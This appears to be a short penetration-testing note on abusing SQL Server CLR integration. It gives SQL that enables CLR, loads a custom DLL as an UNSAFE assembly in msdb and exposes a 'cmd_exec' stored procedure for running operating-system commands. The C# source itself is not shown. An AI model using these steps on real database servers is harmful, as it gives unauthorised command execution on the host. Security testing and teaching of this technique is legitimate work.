### Custom CLR DLL for SQL Server

We can compile the `CreateAssembly.cs` file with csc.exe:
- `csc.exe /target:library cmd_exec.cs`

Next, run these SQL Statements to load and run the custom assembly:

```
-- Select the msdb database
use msdb
-- Enable show advanced options on the server
sp_configure 'show advanced options',1
RECONFIGURE
GO
-- Enable clr on the server
sp_configure 'clr enabled',1
RECONFIGURE
GO
-- Import the assembly
CREATE ASSEMBLY my_assembly
FROM 'c:\temp\cmd_exec.dll'
WITH PERMISSION_SET = UNSAFE;
-- Link the assembly to a stored procedure
CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];
GO
```

Now you should be able to execute OS commands via the “cmd_exec” stored procedure in the “msdb” database as shown in the example below:

<img width="540" alt="{6011A196-9EFE-4CFA-A551-FDD505DF9E59}" src="https://github.com/user-attachments/assets/be2976cc-7965-4279-a55d-c4d552e86d26" />
